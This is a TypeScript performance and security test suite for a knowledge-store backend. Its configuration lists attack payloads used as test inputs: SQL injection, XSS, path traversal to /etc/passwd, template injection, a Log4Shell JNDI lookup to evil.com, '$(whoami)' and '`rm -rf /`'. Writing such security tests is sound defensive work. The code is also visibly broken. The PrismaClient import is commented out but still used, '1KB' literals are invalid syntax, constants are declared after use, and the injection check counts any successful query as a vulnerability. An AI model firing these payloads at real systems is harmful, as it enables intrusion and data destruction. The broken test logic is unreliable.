/**
 * Cortex MCP Performance & Security Testing Suite
 *
 * Comprehensive testing suite for production readiness validation
 * covering performance benchmarks and security assessments
 *
 * @version 1.0.0
 */

import { performance } from 'perf_hooks';
// PrismaClient removed - system now uses Qdrant + PostgreSQL architecture';
import { logger } from '../utils/logger.js';

// ============================================================================
// Test Configuration
// ============================================================================

interface TestConfig {
  maxItems: number;
  concurrentUsers: number;
  payloadSize: number;
  searchQueries: string[];
  attackPayloads: string[];
}

const TEST_CONFIG: TestConfig = {
  maxItems: 1000,
  concurrentUsers: 10,
  payloadSize: 100000, // 100KB payloads
  searchQueries: [
    'test query',
    'performance testing',
    'security assessment',
    'database operations',
    'system validation'
  ],
  attackPayloads: [
    "' OR '1'='1",
    "<script>alert('xss')</script>",
    "../../etc/passwd",
    "{{7*7}}",
    "${jndi:ldap://evil.com/a}",
    "$(whoami)",
    "`rm -rf /`",
    "\x00\x01\x02\x03",
    "🔥💣🚀🚨⚠️",
    String.fromCharCode(...Array.from({length: 1000}, (_, i) => i % 256))
  ]
};

// ============================================================================
// Performance Metrics
// ============================================================================

interface PerformanceMetrics {
  operation: string;
  responseTime: number;
  memoryUsage: number;
  cpuUsage?: number;
  success: boolean;
  error?: string;
  timestamp: number;
}

interface SecurityTestResult {
  testType: string;
  payload: string;
  blocked: boolean;
  responseTime: number;
  vulnerability?: string;
  recommendation?: string;
}

interface TestResults {
  performance: PerformanceMetrics[];
  security: SecurityTestResult[];
  summary: {
    totalTests: number;
    passedTests: number;
    failedTests: number;
    avgResponseTime: number;
    maxResponseTime: number;
    minResponseTime: number;
    vulnerabilities: number;
    recommendations: string[];
  };
}

// ============================================================================
// Performance Testing Functions
// ============================================================================

class PerformanceTestSuite {
  private prisma: PrismaClient;
  private metrics: PerformanceMetrics[] = [];

  constructor() {
    this.prisma = new PrismaClient();
  }

  /**
   * Test single operation performance
   */
  async testSingleOperation(operation: string, testFn: () => Promise<any>): Promise<PerformanceMetrics> {
    const startTime = performance.now();
    const startMemory = process.memoryUsage();

    try {
      await testFn();
      const endTime = performance.now();
      const endMemory = process.memoryUsage();

      const metric: PerformanceMetrics = {
        operation,
        responseTime: endTime - startTime,
        memoryUsage: endMemory.heapUsed - startMemory.heapUsed,
        success: true,
        timestamp: Date.now()
      };

      this.metrics.push(metric);
      return metric;
    } catch (error) {
      const endTime = performance.now();

      const metric: PerformanceMetrics = {
        operation,
        responseTime: endTime - startTime,
        memoryUsage: 0,
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        timestamp: Date.now()
      };

      this.metrics.push(metric);
      return metric;
    }
  }

  /**
   * Test bulk operations performance
   */
  async testBulkOperations(): Promise<PerformanceMetrics[]> {
    const results: PerformanceMetrics[] = [];
    const bulkSizes = [10, 50, 100, 500, 1000];

    for (const size of bulkSizes) {
      const items = this.generateTestItems(size);

      const metric = await this.testSingleOperation(
        `bulk_store_${size}`,
        async () => {
          // Simulate bulk store operation
          const promises = items.map(item =>
            this.prisma.knowledge.create({ data: item })
          );
          await Promise.all(promises);
        }
      );

      results.push(metric);
      logger.info(`Bulk operation (${size} items): ${metric.responseTime.toFixed(2)}ms`);
    }

    return results;
  }

  /**
   * Test concurrent operations
   */
  async testConcurrentOperations(): Promise<PerformanceMetrics[]> {
    const results: PerformanceMetrics[] = [];
    const concurrencyLevels = [1, 5, 10, 20];

    for (const concurrency of concurrencyLevels) {
      const startTime = performance.now();

      try {
        const promises = Array.from({ length: concurrency }, () =>
          this.testSingleOperation(
            `concurrent_operation_${concurrency}`,
            async () => {
              // Simulate concurrent read/write
              const item = this.generateTestItems(1)[0];
              await this.prisma.knowledge.create({ data: item });
              await this.prisma.knowledge.findMany({ take: 10 });
            }
          )
        );

        const concurrentResults = await Promise.all(promises);
        const endTime = performance.now();

        const avgResponseTime = concurrentResults.reduce((sum, r) => sum + r.responseTime, 0) / concurrency;

        results.push({
          operation: `concurrent_${concurrency}`,
          responseTime: avgResponseTime,
          memoryUsage: 0,
          success: true,
          timestamp: Date.now()
        });

        logger.info(`Concurrent operations (${concurrency}): ${avgResponseTime.toFixed(2)}ms avg`);
      } catch (error) {
        results.push({
          operation: `concurrent_${concurrency}`,
          responseTime: 0,
          memoryUsage: 0,
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
          timestamp: Date.now()
        });
      }
    }

    return results;
  }

  /**
   * Test search performance with varying data sizes
   */
  async testSearchPerformance(): Promise<PerformanceMetrics[]> {
    const results: PerformanceMetrics[] = [];
    const dataSizes = [0, 100, 500, 1000, 5000];

    for (const size of dataSizes) {
      // Setup test data
      if (size > 0) {
        const items = this.generateTestItems(size);
        await this.prisma.knowledge.createMany({ data: items, skipDuplicates: true });
      }

      // Test different query types
      for (const query of TEST_CONFIG.searchQueries) {
        const metric = await this.testSingleOperation(
          `search_${size}_${query.replace(/\s+/g, '_')}`,
          async () => {
            await this.prisma.knowledge.findMany({
              where: {
                OR: [
                  { content: { contains: query } },
                  { metadata: { contains: query } }
                ]
              },
              take: 50
            });
          }
        );

        results.push(metric);
      }
    }

    return results;
  }

  /**
   * Test large data handling
   */
  async testLargeDataHandling(): Promise<PerformanceMetrics[]> {
    const results: PerformanceMetrics[] = [];
    const payloadSizes = [1KB, 10KB, 100KB, 1MB];

    const generateLargePayload = (size: number) => {
      return 'x'.repeat(size);
    };

    for (const size of payloadSizes) {
      const largePayload = generateLargePayload(size);

      const metric = await this.testSingleOperation(
        `large_payload_${size}`,
        async () => {
          const item = {
            kind: 'observation',
            scope: { project: 'performance_test' },
            data: {
              title: `Large Payload Test (${size})`,
              content: largePayload,
              metadata: { size, timestamp: Date.now() }
            }
          };

          await this.prisma.knowledge.create({ data: item });
        }
      );

      results.push(metric);
      logger.info(`Large payload (${size}): ${metric.responseTime.toFixed(2)}ms`);
    }

    return results;
  }

  /**
   * Generate test items for performance testing
   */
  private generateTestItems(count: number): any[] {
    const kinds = ['entity', 'observation', 'decision', 'issue', 'todo'];
    return Array.from({ length: count }, (_, i) => ({
      kind: kinds[i % kinds.length],
      scope: { project: 'performance_test' },
      data: {
        title: `Test Item ${i}`,
        content: `Test content for item ${i} with some searchable text`,
        metadata: { index: i, timestamp: Date.now() }
      }
    }));
  }

  getMetrics(): PerformanceMetrics[] {
    return this.metrics;
  }

  async cleanup(): Promise<void> {
    await this.prisma.knowledge.deleteMany({
      where: { scope: { project: 'performance_test' } }
    });
    await this.prisma.$disconnect();
  }
}

// ============================================================================
// Security Testing Functions
// ============================================================================

class SecurityTestSuite {
  private prisma: PrismaClient;
  private results: SecurityTestResult[] = [];

  constructor() {
    this.prisma = new PrismaClient();
  }

  /**
   * Test SQL injection attempts
   */
  async testSqlInjection(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    for (const payload of TEST_CONFIG.attackPayloads.filter(p => p.includes("'"))) {
      const startTime = performance.now();
      let blocked = true;
      let vulnerability = '';

      try {
        // Test SQL injection in various parameters
        const queries = [
          this.prisma.knowledge.findMany({
            where: { content: { contains: payload } }
          }),
          this.prisma.knowledge.findMany({
            where: { metadata: { contains: payload } }
          })
        ];

        await Promise.all(queries);

        // If we get here without error, the injection might have worked
        // In a real test, we'd check for unexpected data exposure
        blocked = false;
        vulnerability = 'Potential SQL injection vulnerability';
      } catch (error) {
        // Error is expected - injection was blocked
        blocked = true;
      }

      const endTime = performance.now();

      results.push({
        testType: 'SQL_INJECTION',
        payload,
        blocked,
        responseTime: endTime - startTime,
        vulnerability: blocked ? undefined : vulnerability,
        recommendation: blocked ? undefined : 'Implement proper input sanitization and parameterized queries'
      });
    }

    this.results.push(...results);
    return results;
  }

  /**
   * Test XSS attempts
   */
  async testXSS(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    for (const payload of TEST_CONFIG.attackPayloads.filter(p => p.includes('<script>'))) {
      const startTime = performance.now();
      let blocked = true;
      let vulnerability = '';

      try {
        // Attempt to store XSS payload
        const item = {
          kind: 'observation',
          scope: { project: 'security_test' },
          data: {
            title: 'XSS Test',
            content: payload,
            metadata: { test: 'xss' }
          }
        };

        await this.prisma.knowledge.create({ data: item });

        // Check if payload is stored without sanitization
        const retrieved = await this.prisma.knowledge.findFirst({
          where: { content: { contains: payload } }
        });

        if (retrieved && retrieved.content.includes('<script>')) {
          blocked = false;
          vulnerability = 'XSS payload stored without sanitization';
        }
      } catch (error) {
        blocked = true;
      }

      const endTime = performance.now();

      results.push({
        testType: 'XSS',
        payload,
        blocked,
        responseTime: endTime - startTime,
        vulnerability: blocked ? undefined : vulnerability,
        recommendation: blocked ? undefined : 'Implement HTML sanitization for user-generated content'
      });
    }

    this.results.push(...results);
    return results;
  }

  /**
   * Test path traversal attempts
   */
  async testPathTraversal(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    for (const payload of TEST_CONFIG.attackPayloads.filter(p => p.includes('../'))) {
      const startTime = performance.now();
      let blocked = true;
      let vulnerability = '';

      try {
        // Test path traversal in project names
        const item = {
          kind: 'entity',
          scope: { project: payload },
          data: {
            title: 'Path Traversal Test',
            content: 'Testing path traversal',
            metadata: { test: 'path_traversal' }
          }
        };

        await this.prisma.knowledge.create({ data: item });

        // Check if malicious path was accepted
        const retrieved = await this.prisma.knowledge.findFirst({
          where: { scope: { project: { contains: payload } } }
        });

        if (retrieved) {
          blocked = false;
          vulnerability = 'Path traversal payload accepted in project name';
        }
      } catch (error) {
        blocked = true;
      }

      const endTime = performance.now();

      results.push({
        testType: 'PATH_TRAVERSAL',
        payload,
        blocked,
        responseTime: endTime - startTime,
        vulnerability: blocked ? undefined : vulnerability,
        recommendation: blocked ? undefined : 'Implement path validation and sanitization'
      });
    }

    this.results.push(...results);
    return results;
  }

  /**
   * Test input validation and boundary conditions
   */
  async testInputValidation(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    // Test various malformed inputs
    const malformedInputs = [
      null,
      undefined,
      '',
      ' '.repeat(1000),
      String.fromCharCode(...Array.from({length: 10000}, (_, i) => i % 256)),
      { malicious: 'object' },
      [],
      new Date().toISOString(),
      '2147483647', // Max 32-bit int
      '-2147483648', // Min 32-bit int
      '0'.repeat(100), // Very long number
      'a'.repeat(1000000) // Very long string
    ];

    for (const payload of malformedInputs) {
      const startTime = performance.now();
      let blocked = true;
      let vulnerability = '';

      try {
        // Test various input fields
        const testCases = [
          () => this.prisma.knowledge.create({
            data: {
              kind: 'observation',
              scope: { project: String(payload) },
              data: { content: payload }
            }
          }),
          () => this.prisma.knowledge.findMany({
            where: { content: { contains: String(payload) } }
          })
        ];

        for (const testCase of testCases) {
          await testCase();
        }

        // If no errors occurred, validation might be insufficient
        if (payload === null || payload === undefined) {
          blocked = false;
          vulnerability = 'Null/undefined values accepted without validation';
        }
      } catch (error) {
        blocked = true;
      }

      const endTime = performance.now();

      results.push({
        testType: 'INPUT_VALIDATION',
        payload: String(payload).substring(0, 100),
        blocked,
        responseTime: endTime - startTime,
        vulnerability: blocked ? undefined : vulnerability,
        recommendation: blocked ? undefined : 'Implement comprehensive input validation'
      });
    }

    this.results.push(...results);
    return results;
  }

  /**
   * Test resource exhaustion attacks
   */
  async testResourceExhaustion(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    // Test large payload attacks
    const largePayloads = [
      'x'.repeat(1000000), // 1MB
      'x'.repeat(5000000), // 5MB
      'x'.repeat(10000000) // 10MB
    ];

    for (const payload of largePayloads) {
      const startTime = performance.now();
      let blocked = true;
      let vulnerability = '';

      try {
        const item = {
          kind: 'observation',
          scope: { project: 'resource_test' },
          data: {
            title: 'Large Payload Test',
            content: payload,
            metadata: { size: payload.length }
          }
        };

        await this.prisma.knowledge.create({ data: item });

        // Check if large payload was accepted
        if (payload.length > 1000000) { // 1MB threshold
          blocked = false;
          vulnerability = `Oversized payload (${payload.length} bytes) accepted`;
        }
      } catch (error) {
        blocked = true;
      }

      const endTime = performance.now();

      results.push({
        testType: 'RESOURCE_EXHAUSTION',
        payload: `Large payload (${payload.length} bytes)`,
        blocked,
        responseTime: endTime - startTime,
        vulnerability: blocked ? undefined : vulnerability,
        recommendation: blocked ? undefined : 'Implement payload size limits'
      });
    }

    this.results.push(...results);
    return results;
  }

  getResults(): SecurityTestResult[] {
    return this.results;
  }

  async cleanup(): Promise<void> {
    await this.prisma.knowledge.deleteMany({
      where: {
        OR: [
          { scope: { project: 'security_test' } },
          { scope: { project: 'resource_test' } }
        ]
      }
    });
    await this.prisma.$disconnect();
  }
}

// ============================================================================
// Test Orchestration
// ============================================================================

export class PerformanceSecurityTester {
  private performanceSuite: PerformanceTestSuite;
  private securitySuite: SecurityTestSuite;

  constructor() {
    this.performanceSuite = new PerformanceTestSuite();
    this.securitySuite = new SecurityTestSuite();
  }

  /**
   * Run complete performance and security test suite
   */
  async runFullTestSuite(): Promise<TestResults> {
    logger.info('Starting comprehensive performance and security testing...');

    const performanceResults: PerformanceMetrics[] = [];
    const securityResults: SecurityTestResult[] = [];

    // Performance Tests
    logger.info('Running performance tests...');

    // Single operation tests
    performanceResults.push(...await this.performanceSuite.testBulkOperations());
    performanceResults.push(...await this.performanceSuite.testConcurrentOperations());
    performanceResults.push(...await this.performanceSuite.testSearchPerformance());
    performanceResults.push(...await this.performanceSuite.testLargeDataHandling());

    // Security Tests
    logger.info('Running security tests...');

    securityResults.push(...await this.securitySuite.testSqlInjection());
    securityResults.push(...await this.securitySuite.testXSS());
    securityResults.push(...await this.securitySuite.testPathTraversal());
    securityResults.push(...await this.securitySuite.testInputValidation());
    securityResults.push(...await this.securitySuite.testResourceExhaustion());

    // Generate summary
    const summary = this.generateSummary(performanceResults, securityResults);

    logger.info('Test suite completed');

    return {
      performance: performanceResults,
      security: securityResults,
      summary
    };
  }

  /**
   * Generate test summary with recommendations
   */
  private generateSummary(
    performanceResults: PerformanceMetrics[],
    securityResults: SecurityTestResult[]
  ): TestResults['summary'] {
    const totalTests = performanceResults.length + securityResults.length;
    const passedPerformanceTests = performanceResults.filter(r => r.success).length;
    const passedSecurityTests = securityResults.filter(r => r.blocked).length;
    const passedTests = passedPerformanceTests + passedSecurityTests;
    const failedTests = totalTests - passedTests;

    const responseTimes = performanceResults
      .filter(r => r.success)
      .map(r => r.responseTime);

    const avgResponseTime = responseTimes.length > 0
      ? responseTimes.reduce((sum, time) => sum + time, 0) / responseTimes.length
      : 0;

    const maxResponseTime = responseTimes.length > 0 ? Math.max(...responseTimes) : 0;
    const minResponseTime = responseTimes.length > 0 ? Math.min(...responseTimes) : 0;

    const vulnerabilities = securityResults.filter(r => !r.blocked).length;

    const recommendations: string[] = [];

    // Performance recommendations
    if (avgResponseTime > 50) {
      recommendations.push('Average response time exceeds 50ms target - consider optimization');
    }

    if (maxResponseTime > 500) {
      recommendations.push('Maximum response time exceeds 500ms - investigate slow operations');
    }

    // Security recommendations
    if (vulnerabilities > 0) {
      recommendations.push(`${vulnerabilities} security vulnerabilities found - immediate attention required`);
    }

    const unblockedSecurityTests = securityResults.filter(r => !r.blocked);
    for (const test of unblockedSecurityTests) {
      if (test.recommendation) {
        recommendations.push(test.recommendation);
      }
    }

    return {
      totalTests,
      passedTests,
      failedTests,
      avgResponseTime,
      maxResponseTime,
      minResponseTime,
      vulnerabilities,
      recommendations
    };
  }

  /**
   * Generate detailed report
   */
  generateReport(results: TestResults): string {
    const report = [
      '# Cortex MCP Performance & Security Assessment Report',
      '',
      `Generated: ${new Date().toISOString()}`,
      '',
      '## Executive Summary',
      '',
      `- **Total Tests**: ${results.summary.totalTests}`,
      `- **Passed**: ${results.summary.passedTests} (${((results.summary.passedTests / results.summary.totalTests) * 100).toFixed(1)}%)`,
      `- **Failed**: ${results.summary.failedTests} (${((results.summary.failedTests / results.summary.totalTests) * 100).toFixed(1)}%)`,
      `- **Security Vulnerabilities**: ${results.summary.vulnerabilities}`,
      '',
      '## Performance Metrics',
      '',
      `- **Average Response Time**: ${results.summary.avgResponseTime.toFixed(2)}ms`,
      `- **Max Response Time**: ${results.summary.maxResponseTime.toFixed(2)}ms`,
      `- **Min Response Time**: ${results.summary.minResponseTime.toFixed(2)}ms`,
      '',
      '### Performance Targets',
      '',
      '| Target | Status | Actual |',
      '|--------|--------|--------|',
      `| Single Operations < 50ms | ${results.summary.avgResponseTime < 50 ? '✅ PASS' : '❌ FAIL'} | ${results.summary.avgResponseTime.toFixed(2)}ms |`,
      `| Bulk Operations < 500ms | ${results.summary.maxResponseTime < 500 ? '✅ PASS' : '❌ FAIL'} | ${results.summary.maxResponseTime.toFixed(2)}ms |`,
      '',
      '## Security Assessment',
      '',
      `### Vulnerability Summary: ${results.summary.vulnerabilities > 0 ? '❌ ISSUES FOUND' : '✅ SECURE'}`,
      '',
      results.summary.vulnerabilities > 0 ? '### Critical Issues Found:' : 'No critical security vulnerabilities detected.',
      '',
      '### Security Test Results',
      '',
      '| Test Type | Payload | Status | Response Time |',
      '|-----------|---------|--------|---------------|',
      ...results.security.map(test =>
        `| ${test.testType} | ${test.payload.substring(0, 30)}... | ${test.blocked ? '✅ BLOCKED' : '❌ VULNERABLE'} | ${test.responseTime.toFixed(2)}ms |`
      ),
      '',
      '## Recommendations',
      '',
      ...results.summary.recommendations.map(rec => `- ${rec}`),
      '',
      '## Production Readiness Assessment',
      '',
      this.getProductionReadinessAssessment(results),
      '',
      '---',
      '*Report generated by Cortex MCP Performance & Security Testing Suite*'
    ];

    return report.join('\n');
  }

  /**
   * Get production readiness assessment
   */
  private getProductionReadinessAssessment(results: TestResults): string {
    const performanceReady = results.summary.avgResponseTime < 50 && results.summary.maxResponseTime < 500;
    const securityReady = results.summary.vulnerabilities === 0;
    const successRate = (results.summary.passedTests / results.summary.totalTests) * 100;

    if (performanceReady && securityReady && successRate >= 95) {
      return '✅ **PRODUCTION READY** - System meets all performance and security requirements for production deployment.';
    } else if (performanceReady && securityReady && successRate >= 90) {
      return '⚠️ **CONDITIONALLY READY** - System meets core requirements but should address remaining issues before production deployment.';
    } else {
      return '❌ **NOT PRODUCTION READY** - Critical issues must be resolved before production deployment.';
    }
  }

  async cleanup(): Promise<void> {
    await this.performanceSuite.cleanup();
    await this.securitySuite.cleanup();
  }
}

// Utility constants
const KB = 1024;
const MB = 1024 * KB;